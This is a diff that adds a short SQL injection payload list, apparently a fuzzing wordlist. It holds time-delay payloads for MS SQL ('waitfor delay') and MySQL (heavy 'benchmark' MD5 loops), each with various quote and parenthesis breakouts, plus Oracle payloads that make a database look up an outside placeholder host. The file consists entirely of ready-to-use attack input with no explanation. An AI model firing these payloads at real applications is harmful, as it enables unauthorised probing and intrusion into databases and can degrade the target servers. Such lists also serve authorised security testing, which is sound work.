@@ -1,0 +1,15 @@
+1 waitfor delay '0:0:X'--
+1; waitfor delay '0:0:X'--
+1'; waitfor delay '0:0:X'--
+1); waitfor delay '0:0:X'--
+1)); waitfor delay '0:0:X'--
+1'); waitfor delay '0:0:X'--
+1')); waitfor delay '0:0:X'--
+1 or benchmark(100000000,MD5(1))#
+1' or benchmark(100000000,MD5(1))#
+1) or benchmark(100000000,MD5(1))#
+1') or benchmark(100000000,MD5(1))#
+1)) or benchmark(100000000,MD5(1))#
+1')) or benchmark(100000000,MD5(1))#
+1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--
+1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--
